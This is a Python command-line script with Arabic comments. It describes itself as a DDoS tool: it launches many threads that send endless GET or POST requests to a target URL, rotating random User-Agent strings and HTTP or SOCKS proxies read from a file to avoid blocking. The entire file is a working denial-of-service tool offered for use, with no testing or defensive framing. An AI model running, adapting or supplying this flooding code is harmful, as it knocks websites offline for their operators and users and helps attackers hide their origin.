import requests
import random
import threading
import time
import argparse
from fake_useragent import UserAgent  # استيراد مكتبة fake_useragent
import string

# إنشاء UserAgent من مكتبة fake_useragent
ua = UserAgent()

# قراءة قائمة البروكسيات من ملف .txt
def load_proxies(file_path):
    with open(file_path, 'r') as file:
        proxies = [line.strip() for line in file if line.strip()]
    return proxies

# دالة لتوليد بيانات POST عشوائية
def generate_random_data():
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    return {'data': random_string}

# دالة لتنفيذ الهجوم DOS
def dos(target, method, data=None, proxies_list=None):
    while True:
        try:
            # اختيار User-Agent بشكل عشوائي باستخدام مكتبة fake_useragent
            user_agent = ua.random
            headers = {
                "User-Agent": user_agent
            }
            
            # اختيار بروكسي بشكل عشوائي لكل طلب
            if proxies_list:
                proxy = random.choice(proxies_list)
                if proxy.startswith("socks4://"):
                    proxy_dict = {
                        "http": proxy,
                        "https": proxy
                    }
                elif proxy.startswith("socks5://"):
                    proxy_dict = {
                        "http": proxy,
                        "https": proxy
                    }
                else:
                    proxy_dict = {
                        "http": "http://" + proxy,
                        "https": "http://" + proxy
                    }
            else:
                proxy_dict = None

            # إذا كان الطلب POST، نولد بيانات عشوائية
            if method == "POST":
                post_data = generate_random_data()
                res = requests.post(target, data=post_data, headers=headers, proxies=proxy_dict)
            else:
                res = requests.get(target, headers=headers, proxies=proxy_dict)

            print(f"Request sent using {method}! User-Agent: {user_agent}, Proxy: {proxy}")
        
        except requests.exceptions.ConnectionError:
            print("[!!!] Connection error!")
        except Exception as e:
            print(f"[!!!] An error occurred: {e}")

# استخدام argparse لأخذ المعطيات من سطر الأوامر
def get_arguments():
    parser = argparse.ArgumentParser(description="DDoS tool with proxy, user-agent, and POST data support")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-t", "--threads", help="Number of threads", type=int, default=20)
    parser.add_argument("-m", "--method", help="HTTP method (GET/POST)", choices=["GET", "POST"], default="GET")
    parser.add_argument("-p", "--proxyfile", help="Path to proxy list file", default=None)
    args = parser.parse_args()
    return args

args = get_arguments()

# تحميل البروكسيات إذا تم توفير ملف
if args.proxyfile:
    proxies = load_proxies(args.proxyfile)
else:
    proxies = None

threads = args.threads
url = args.url
method = args.method

# تشغيل الخيوط
for i in range(threads):
    thr = threading.Thread(target=dos, args=(url, method, None, proxies))
    thr.start()
    print(f"Thread {i + 1} started!")